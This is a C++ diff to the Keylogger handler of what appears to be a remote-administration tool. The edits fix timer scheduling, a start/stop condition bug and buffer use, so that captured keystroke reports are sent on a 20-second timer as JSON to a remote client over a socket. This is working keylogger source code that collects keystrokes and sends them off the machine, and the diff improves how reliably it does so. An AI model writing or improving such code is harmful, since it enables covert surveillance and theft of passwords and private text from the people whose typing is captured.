@@ -11,7 +11,7 @@ namespace http
 	{
 
 		Keylogger::Keylogger(ip::tcp::socket& sock, io_service& io_ref) :
-			TaskHandlerInterface(sock, io_ref), keylog_report_timer(io_ref, boost::posix_time::seconds(4))
+			TaskHandlerInterface(sock, io_ref), keylog_report_timer(io_ref)
 		{
 			operations_queue_ptr = async_op::new_();
 		}
@@ -27,11 +27,11 @@ namespace http
 		{
 			SendMessage(get_window_hWnd(), WM_STOP_KEYLOGGER, 0, 0);
 			isStarted = false;
-			_request_buffer_ptr.reset();
 		}
 
 		void Keylogger::listen_for_report_data()
 		{
+			keylog_report_timer.expires_from_now(boost::posix_time::seconds(20));
 			keylog_report_timer.async_wait(boost::bind(&Keylogger::on_keylog_report_timer_elapsed, this, _1));
 		}
 
@@ -43,12 +43,15 @@ namespace http
 			Hardware& keyboard_hardware = get_keyboard_hardware_instance();
 			std::string utf8_encoded_string = keyboard_hardware.get_timed_report();
 			_reply_buffer_ptr.reset(new reply());
-				
+			
 			std::string extension = "json";
 
 			// Fill out the reply to be sent to the client.
 			_reply_buffer_ptr->status_line = http::server::status_strings::ok;
-			_reply_buffer_ptr->status_line.append(" ").append(wxhtpconstants::ACTION_TYPE::KEYLOGGER_REPORT).append("\r\n");
+			if(keyboard_hardware.isLastReport())
+				_reply_buffer_ptr->status_line.append(" ").append(wxhtpconstants::ACTION_TYPE::KEYLOGGER_STOP).append("\r\n");
+			else
+				_reply_buffer_ptr->status_line.append(" ").append(wxhtpconstants::ACTION_TYPE::KEYLOGGER_REPORT).append("\r\n");
 
 			_reply_buffer_ptr->content.append(utf8_encoded_string);
 
@@ -85,20 +88,20 @@ namespace http
 		bool Keylogger::execute(std::shared_ptr<request> req, std::shared_ptr<reply> rep)
 		{
 			if (req->action_type.compare(wxhtpconstants::ACTION_TYPE::KEYLOGGER_START)
-				|| req->action_type.compare(wxhtpconstants::ACTION_TYPE::KEYLOGGER_STOP))
+				&& req->action_type.compare(wxhtpconstants::ACTION_TYPE::KEYLOGGER_STOP))
 			{
 				return false;
 			}
 			
 			_request_buffer_ptr.swap(req);
-			if (req->action_type.compare(wxhtpconstants::ACTION_TYPE::KEYLOGGER_START) == 0)
+			if (_request_buffer_ptr->action_type.compare(wxhtpconstants::ACTION_TYPE::KEYLOGGER_START) == 0)
 			{
 				if(!isStarted)
 				{
 					start();
 				}
 			}
-			if (req->action_type.compare(wxhtpconstants::ACTION_TYPE::KEYLOGGER_STOP) == 0)
+			if (_request_buffer_ptr->action_type.compare(wxhtpconstants::ACTION_TYPE::KEYLOGGER_STOP) == 0)
 			{
 				if(isStarted)
 				{
